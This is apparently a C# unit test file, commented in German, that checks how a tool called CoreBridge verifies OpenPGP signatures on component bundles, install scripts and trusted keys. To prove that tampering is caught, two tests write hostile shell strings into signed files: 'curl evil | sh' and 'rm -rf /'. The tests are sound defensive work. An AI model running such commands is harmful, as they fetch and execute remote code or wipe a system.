using System.Text;
using CoreBridge.Core.Authenticity;
using CoreBridge.Core.Config;
using CoreBridge.Core.Inits;
using CoreBridge.Core.Multipass;

namespace CoreBridge.Core.Tests;

/// <summary>
/// Komponenten aus allen Quellen mit Herkunft und Signatur: signiert (Benutzer-vertraut),
/// unsigniert, unbekannter Schlüssel, ungültig — auch ein geändertes Skript in einem
/// signierten Bundle und ein unsigniertes Skript neben signierter Definition.
/// </summary>
[Collection("InitStore")]
public class ComponentCatalogTests : IDisposable
{
    private readonly TempDirectory _temp = new();
    private readonly string _app;
    private readonly string _user;

    public ComponentCatalogTests()
    {
        _app = Path.Combine(_temp.Path, "app");
        _user = Path.Combine(_temp.Path, "store");
        Directory.CreateDirectory(Path.Combine(_app, ComponentCatalog.ShippedBundleFolder));
        Directory.CreateDirectory(_user);
        InitStore.Initialize(_user);
    }

    public void Dispose() => _temp.Dispose();

    private ComponentSources Sources => new(_app, "Development", _user);

    private static readonly ComponentConfig Node = new()
    {
        ScriptContent = "#!/bin/bash\nset -Eeuo pipefail\ntouch /var/lib/corebridge/node.ready\n",
        InstallPath = "/usr/local/sbin/corebridge-install-node"
    };

    private string WriteBundle(string folder, string name, ComponentConfig component)
    {
        var file = Path.Combine(folder, name + ComponentCatalog.BundleExtension);
        File.WriteAllText(file, ComponentCatalog.BundleJson(name, component));
        return file;
    }

    private ComponentCatalog Load(AppConfig? config = null, TestKey? trusted = null) =>
        ComponentCatalog.Load(
            config ?? new AppConfig(),
            Sources,
            trusted is null ? TrustedKeys.CoreBridge : new TrustedKeyStoreFor(trusted).Combined(),
            DateTime.UtcNow);

    [Fact]
    public void SigniertMitVertrautemSchluesselIstBenutzerVertraut()
    {
        var key = TestKey.Create("claude-vm <vm@cla.de>");
        key.ClearSignFile(WriteBundle(_user, "node", Node));

        var origin = Load(trusted: key).OriginOf("node")!;

        Assert.Equal(ComponentTrust.UserTrusted, origin.Signature.Trust);
        Assert.Equal(ComponentSource.User, origin.Source);
        Assert.Equal("vertraut: claude-vm", origin.Signature.Label);
        Assert.Contains("signiert von claude-vm <vm@cla.de> (Benutzer-vertraut, Fingerprint " + key.Fingerprint, origin.Signature.Describe());
    }

    [Fact]
    public void OhneVertrauensEintragIstDerSchluesselUnbekannt()
    {
        var key = TestKey.Create("claude-vm <vm@cla.de>");
        key.ClearSignFile(WriteBundle(_user, "node", Node));

        var signature = Load().OriginOf("node")!.Signature;

        Assert.Equal(ComponentTrust.UnknownKey, signature.Trust);
        Assert.Equal(key.Fingerprint, signature.Fingerprint);
        Assert.True(signature.NeedsWarning);
        Assert.Contains("unbekannter Schlüssel " + key.Fingerprint, signature.Describe());
    }

    [Fact]
    public void UnsigniertesBundleIstUnsigniert()
    {
        WriteBundle(Path.Combine(_app, ComponentCatalog.ShippedBundleFolder), "node", Node);

        var origin = Load().OriginOf("node")!;

        Assert.Equal(ComponentTrust.Unsigned, origin.Signature.Trust);
        Assert.Equal(ComponentSource.BuiltIn, origin.Source);
        Assert.True(origin.Signature.NeedsWarning);
    }

    [Fact]
    public void GeaendertesSkriptImSigniertenBundleIstUngueltig()
    {
        var key = TestKey.Create();
        var file = WriteBundle(_user, "node", Node);
        key.ClearSignFile(file);
        File.WriteAllText(file, File.ReadAllText(file).Replace("set -Eeuo pipefail", "curl evil | sh"));

        var signature = Load(trusted: key).OriginOf("node")!.Signature;

        Assert.Equal(ComponentTrust.Invalid, signature.Trust);
        Assert.Contains("nach dem Signieren geändert", signature.Reason);
    }

    [Fact]
    public void InlineClearsigniertesBundleWirdGeladen()
    {
        var key = TestKey.Create();
        var file = WriteBundle(_user, "node", Node);
        File.WriteAllBytes(file, key.ClearSign(File.ReadAllBytes(file)));

        var catalog = Load(trusted: key);

        Assert.Equal(ComponentTrust.UserTrusted, catalog.OriginOf("node")!.Signature.Trust);
        Assert.Equal(Node.ScriptContent, catalog.Inits.Components["node"].ScriptContent);
    }

    [Fact]
    public void SkriptPfadOhneEigeneSignaturMachtDieKomponenteUnsigniert()
    {
        var key = TestKey.Create();
        var script = Path.Combine(_user, "tool.sh");
        File.WriteAllText(script, "#!/bin/sh\ntouch /var/lib/corebridge/tool.ready\n");
        var settings = Path.Combine(_user, "appsettings.user.json");
        File.WriteAllText(settings, ComponentCatalog.BundleJson("tool", new ComponentConfig { Script = script, InstallPath = "/usr/local/sbin/tool" }));
        key.ClearSignFile(settings);

        Assert.Equal(ComponentTrust.Unsigned, Load(trusted: key).OriginOf("tool")!.Signature.Trust);

        // Mit eigener Signatur des Skripts zählt wieder die Definition.
        key.ClearSignFile(script);
        Assert.Equal(ComponentTrust.UserTrusted, Load(trusted: key).OriginOf("tool")!.Signature.Trust);

        File.AppendAllText(script, "rm -rf /\n");
        Assert.Equal(ComponentTrust.Invalid, Load(trusted: key).OriginOf("tool")!.Signature.Trust);
    }

    [Fact]
    public void DerselbeNameInZweiQuellenNenntBeideDateien()
    {
        var shipped = WriteBundle(Path.Combine(_app, ComponentCatalog.ShippedBundleFolder), "node", Node);
        var user = WriteBundle(_user, "node", Node);

        var failure = Assert.Throws<MultipassException>(() => Load());

        Assert.Contains(shipped, failure.Message);
        Assert.Contains(user, failure.Message);
    }

    [Fact]
    public void MitgelieferteKomponenteAusAppsettingsKenntIhreDatei()
    {
        File.WriteAllText(Path.Combine(_app, "appsettings.json"), ComponentCatalog.BundleJson("git", new ComponentConfig { Packages = ["git"] }));
        var config = new AppConfig
        {
            Inits = new InitsConfig { Components = new(StringComparer.OrdinalIgnoreCase) { ["git"] = new ComponentConfig { Packages = ["git"] } } }
        };

        var origin = Load(config).OriginOf("git")!;

        Assert.Equal(Path.Combine(_app, "appsettings.json"), origin.File);
        Assert.Equal(ComponentSource.BuiltIn, origin.Source);
        Assert.Equal(ComponentTrust.Unsigned, origin.Signature.Trust);
    }

    /// <summary>Der Vertrauensordner gilt nie für die mitgelieferten appsettings.</summary>
    [Fact]
    public void BenutzerSchluesselZaehltNichtFuerMitgelieferteAppsettings()
    {
        var key = TestKey.Create();
        var appsettings = Path.Combine(_app, "appsettings.json");
        File.WriteAllText(appsettings, ComponentCatalog.BundleJson("git", new ComponentConfig { Packages = ["git"] }));
        key.ClearSignFile(appsettings);
        var config = new AppConfig
        {
            Inits = new InitsConfig { Components = new(StringComparer.OrdinalIgnoreCase) { ["git"] = new ComponentConfig { Packages = ["git"] } } }
        };

        Assert.Equal(ComponentTrust.UnknownKey, Load(config, trusted: key).OriginOf("git")!.Signature.Trust);
    }

    [Fact]
    public void UmbenanntesBundleWirdAbgelehnt()
    {
        var file = WriteBundle(_user, "node", Node);
        File.Move(file, Path.Combine(_user, "claude" + ComponentCatalog.BundleExtension));

        var failure = Assert.Throws<MultipassException>(() => Load());

        Assert.Contains("genau die Komponente 'claude'", failure.Message);
    }

    [Fact]
    public void InventarImBenutzerordnerIstKeineEinstellung()
    {
        File.WriteAllText(Path.Combine(_user, "inventory.json"), "{ \"Vms\": {} }");
        File.WriteAllText(Path.Combine(_user, "eigene.json"), ComponentCatalog.BundleJson("tool", new ComponentConfig { Packages = ["jq"] }));

        var catalog = Load();

        Assert.Equal(ComponentSource.User, catalog.OriginOf("tool")!.Source);
        Assert.Single(catalog.Inits.Components);
    }

    [Fact]
    public void BundleUebernimmtSignaturUnveraendert()
    {
        var key = TestKey.Create();
        var source = Path.Combine(_temp.Path, "out");
        Directory.CreateDirectory(source);
        var bundle = Path.Combine(source, "node" + ComponentCatalog.BundleExtension);
        File.WriteAllText(bundle, InitComponentStore.Bundle("node", Node));
        key.ClearSignFile(bundle);

        var (name, _, target) = InitComponentStore.AddBundle(Load(), _user, bundle, replace: false);

        Assert.Equal("node", name);
        Assert.Equal(File.ReadAllBytes(bundle), File.ReadAllBytes(target));
        Assert.True(File.Exists(target + SettingsSignatures.ClearsignedExtension));
        Assert.Equal(ComponentTrust.UserTrusted, Load(trusted: key).OriginOf("node")!.Signature.Trust);

        var again = Assert.Throws<MultipassException>(() => InitComponentStore.AddBundle(Load(), _user, bundle, replace: false));
        Assert.Contains("--force", again.Message);

        InitComponentStore.RemoveBundle(target);
        Assert.False(File.Exists(target + SettingsSignatures.ClearsignedExtension));
    }

    [Fact]
    public void BundleTraegtDasSkriptInline()
    {
        var script = Path.Combine(_temp.Path, "x.sh");
        File.WriteAllText(script, "#!/bin/sh\r\necho x\r\n");

        var json = InitComponentStore.Bundle("x", new ComponentConfig { Script = script, InstallPath = "/usr/local/sbin/x" });
        var parsed = ComponentCatalog.ParseComponents(Encoding.UTF8.GetBytes(json), "x.component.json")["x"];

        Assert.Null(parsed.Script);
        Assert.Equal("#!/bin/sh\necho x\n", parsed.ScriptContent);
        Assert.Contains("echo x", InitCloudInit.Generate("p", new InitsConfig { Components = new(StringComparer.OrdinalIgnoreCase) { ["x"] = parsed } }, ["x"]));
        Assert.Single(InitInstall.Plan(new InitsConfig { Components = new(StringComparer.OrdinalIgnoreCase) { ["x"] = parsed } }, ["x"]), step => step.IsUpload && step.ScriptContent == parsed.ScriptContent);
    }

    /// <summary>Vertrauensordner mit genau einem Testschlüssel.</summary>
    private sealed class TrustedKeyStoreFor(TestKey key)
    {
        public Org.BouncyCastle.Bcpg.OpenPgp.PgpPublicKeyRingBundle Combined()
        {
            var folder = Path.Combine(Path.GetTempPath(), "cbx-trust-" + Guid.NewGuid().ToString("N"));
            try
            {
                Directory.CreateDirectory(folder);
                var file = Path.Combine(folder, "key.asc");
                File.WriteAllBytes(file, key.ArmoredPublic);
                var store = new TrustedKeyStore(Path.Combine(folder, "trusted"));
                store.Trust(file);
                return store.Combined(TrustedKeys.CoreBridge);
            }
            finally
            {
                Directory.Delete(folder, recursive: true);
            }
        }
    }
}

public class TrustedKeyStoreTests
{
    [Fact]
    public void VertrauenListeUndEntzug()
    {
        using var temp = new TempDirectory();
        var key = TestKey.Create("claude-vm <vm@cla.de>");
        var file = Path.Combine(temp.Path, "claude-vm.pub.asc");
        File.WriteAllBytes(file, key.ArmoredPublic);
        var store = new TrustedKeyStore(Path.Combine(temp.Path, TrustedKeyStore.FolderName));

        var added = Assert.Single(store.Trust(file));

        Assert.Equal(key.Fingerprint, added.Fingerprint);
        Assert.Equal("claude-vm <vm@cla.de>", Assert.Single(store.List()).UserId);
        Assert.NotNull(store.Combined(TrustedKeys.CoreBridge).GetPublicKeyRing(key.Public.GetKeyRings().Cast<Org.BouncyCastle.Bcpg.OpenPgp.PgpPublicKeyRing>().Single().GetPublicKey().KeyId));
        Assert.Throws<InvalidDataException>(() => store.Untrust("1234"));

        store.Untrust(key.Fingerprint[^16..]);
        Assert.Empty(store.List());
    }

    [Fact]
    public void GeheimerSchluesselWirdAbgelehnt()
    {
        using var temp = new TempDirectory();
        var file = Path.Combine(temp.Path, "secret.asc");
        File.WriteAllBytes(file, TestKey.Create().ArmoredSecret);

        var failure = Assert.Throws<InvalidDataException>(() => new TrustedKeyStore(Path.Combine(temp.Path, "t")).Trust(file));

        Assert.Contains("geheimer Schlüssel", failure.Message);
    }

    [Fact]
    public void ClearsignDesSignersPruefenGpgKompatibelWieDieDatei()
    {
        using var temp = new TempDirectory();
        var key = TestKey.Create();
        var file = Path.Combine(temp.Path, "a.json");
        File.WriteAllText(file, "{\n  \"a\": \"- b\"  \n}\n-- dash\n");
        key.ClearSignFile(file);

        Assert.True(SettingsSignatures.VerifyFile(file, key.Public, DateTime.UtcNow).Valid);

        // Inline: die Clearsign-Datei selbst ist ladbar und liefert den Klartext.
        var inline = Path.Combine(temp.Path, "b.json");
        File.Copy(file + SettingsSignatures.ClearsignedExtension, inline);
        var read = SettingsSignatures.Read(inline, File.ReadAllBytes(inline), key.Public, DateTime.UtcNow);
        Assert.True(read.Check.Valid, read.Check.Reason);
        Assert.Contains("-- dash", Encoding.UTF8.GetString(read.Content));
    }
}
